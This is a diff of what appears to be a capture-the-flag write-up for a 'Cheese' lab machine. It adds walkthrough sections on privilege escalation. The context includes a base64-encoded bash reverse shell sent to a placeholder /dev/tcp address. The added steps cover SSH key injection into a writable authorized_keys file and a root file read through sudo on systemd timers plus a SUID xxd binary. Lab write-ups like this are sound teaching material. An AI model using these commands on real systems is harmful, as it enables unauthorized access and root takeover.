@@ -53,7 +53,7 @@ My command got executed successfully.
 
 ![](/assets/cheese-thm/10.png)
 
-### Initial Access
+### Initial Access and Exploitation
 Obviously, the next step is to send a reverse shell connection to my local machine. In order to avoid any conflicts between the url and my reverse shell command, I decided to encode it and fix it into the url so that the url does the decoding by itself.
 ```bash
 echo 'echo '/bin/bash -i >& /dev/tcp/<your_ip>/<listening port> 0>&1'|base64
@@ -83,9 +83,84 @@ python3 -c 'import pty;pty.spawn("/bin/bash")'
 ```bash
 stty raw -echo;fg
 ```
-Press `Ctrl + c` when you get hit with the `Terminal type?`
+Press `Ctrl + c` when you get hit with the `Terminal type?` and type:
 ```bash
 export TERM=xterm
 ```
 ### Privilege Escalation to comte
-Since I gained a shell as a low-end user (www-data), the next step is to escalate privileges to a high-end user. I first ran `linpeas` to see if there's anything I can take advantage of.
+Since I gained a shell as a low-end user (www-data), the next step is to escalate privileges to a high-end user. I first ran `linpeas` to see if there's anything I can take advantage of. I found that I had write privileges over `/etc/systemd/system/exploit.timer`.
+
+![](/assets/cheese-thm/14.png)
+
+At the moment, this can't be used to escalate privileges so we'll keep this detail because it might be needed as we move on. I did further navigation and realized that, I had `read and write` privileges over the `/home/comte/.ssh/authorized_keys` file.
+
+![](/assets/cheese-thm/15.png)
+
+This is a very interesting detail and we can take advantage of this by *creating an ssh key on our local machine and pasting the public key into the `authorized_keys` file*. I quickly headed to my local machine and created the ssh key with the command:
+```bash
+ssh-keygen -t rsa
+```
+Afterwards, I copied the `id_rsa.pub` key and echoed it into the `authorized_keys` file on the target machine.
+
+![](/assets/cheese-thm/16.png)
+![](/assets/cheese-thm/17.png)
+
+I then made the `id_rsa` key on my local machine readable and writeable by only the `owner` since permission counts in gaining ssh connection with an `id_rsa` key. Command:
+```bash
+chmod 600 id_rsa
+```
+![](/assets/cheese-thm/32.png)
+
+With my public key on the target machine, I can go ahead and connect to ssh with the command:
+```bash
+ssh -i id_rsa comte@<target_ip>
+```
+![](/assets/cheese-thm/19.png)
+
+Since we're now recognized as `comte`, we can go ahead and read the user flag in the `/home/comte/user.txt`.
+
+![](/assets/cheese-thm/20.png)
+
+### Privilege Escalation to root
+Now, we're in the final stage which is *Privilege Escalation*. The first step I took was to check for sudo privileges with the command
+```bash
+sudo -l
+```
+I found 4 privileges which were, `daemon-reload`, `start, restart and enable exploit.timer`.
+
+![](/assets/cheese-thm/21.png)
+
+Since we have `sudo` privileges over `exploit.timer`, I decided to view the content of `exploit.timer` and the service itself which is `exploit.service` and located at /etc/systemd/system/exploit.service
+![](/assets/cheese-thm/23.png)
+![](/assets/cheese-thm/25.png)
+
+After viewing the content of `exploit.timer`, I realized that `OnBootSec` wasn't set and I'll bump into an error if I execute it without setting it to a value. What I did here was, I set `OnUnitActiveSec` and `OnBootSec` to `0`.
+
+![](/assets/cheese-thm/24.png).
+
+Also, after analyzing the content of `exploit.service`, I found that it executes some commands which are, it copies `/usr/bin/xxd` to `/opt/xxd` and it gives it an `SUID` binary which makes the file run with the permission of the `owner` which in this case is `root` and also makes it executable.
+But this is what we need to ask ourselves... `what is xxd? and what is it used for?` If we find answers to these questions, we'll know how to take advantage of it. After some research, I found out that it can be used for `file read` and we're fortunate that it's owner is root and it has `SUID` set to it so we can read root's flag with this 😊.
+I headed to `https://gtfobins.github.io/gtfobins/xxd/#sudo` where I found how the command is used.
+I then executed the commands I have `sudo` privileges over in the format:
+```bash
+sudo /bin/systemctl daemon-reload
+sudo /bin/systemctl restart exploit.timer
+sudo /bin/systemctl start exploit.timer
+sudo /bin/systemctl enable exploit.timer
+LFILE=/root/root.txt
+```
+
+![](/assets/cheese-thm/26.png)
+![](/assets/cheese-thm/27.png)
+
+Afterwards, I listed the content of `/opt` and saw that `xxd` has been added.
+
+![](/assets/cheese-thm/28.png)
+
+I navigated to `/opt` and run the final command which is:
+```bash
+./xxd "$LFILE" | xxd -r
+```
+and had the flag😉.
+
+![](/assets/cheese-thm/29.png)
